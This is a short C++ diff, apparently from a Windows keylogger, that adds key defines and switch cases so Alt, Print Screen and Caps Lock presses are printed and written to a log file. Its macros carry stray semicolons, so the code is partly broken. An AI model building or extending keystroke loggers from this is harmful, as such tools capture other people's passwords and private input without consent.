@@ -24,6 +24,10 @@
 #define VK_RBUTTON 0x02;
 #define VK_LBUTTON 0x01;
 #define VK_LSHIFT 0xA0;
+#define VK_RSHIFT 0xA1;
+#define VK_CAPITAL 0x14;
+#define VK_SNAPSHOT 0x2c; 
+#define VK_LMENU 0xA4;
 
 
 void WriteToFile(LPCSTR text)
@@ -373,6 +377,7 @@ bool Key_is_Listed(WORD iKey)
 		}
 		break;
 
+
 	case 90:
 		if (GetAsyncKeyState(0xA0))
 		{
@@ -382,6 +387,20 @@ bool Key_is_Listed(WORD iKey)
 		break;
 
 
+	case 0xA4:
+		std::cout << "  *Left_ALT*  ";
+		WriteToFile("  *Left_ALT*  ");
+		break;
+
+	case 0x2c:
+		std::cout << "  *PRINT_SCREEN*  ";
+		WriteToFile("  *PRINT_SCREEN*  ");
+		break;
+
+	case 0x14:
+		std::cout << "  *CAPS_LOCK*  ";
+		WriteToFile("  *CAPS_LOCK*  ");
+		break;
 
 	case 0x0D:
 		std::cout << "\n";
@@ -393,7 +412,7 @@ bool Key_is_Listed(WORD iKey)
 		WriteToFile(" *Left_Shift* ");
 		break;
 
-	case VK_RSHIFT:
+	case 0xA1:
 		std::cout << " *Right_Shift* ";
 		WriteToFile(" *Right_Shift* ");
 		break;
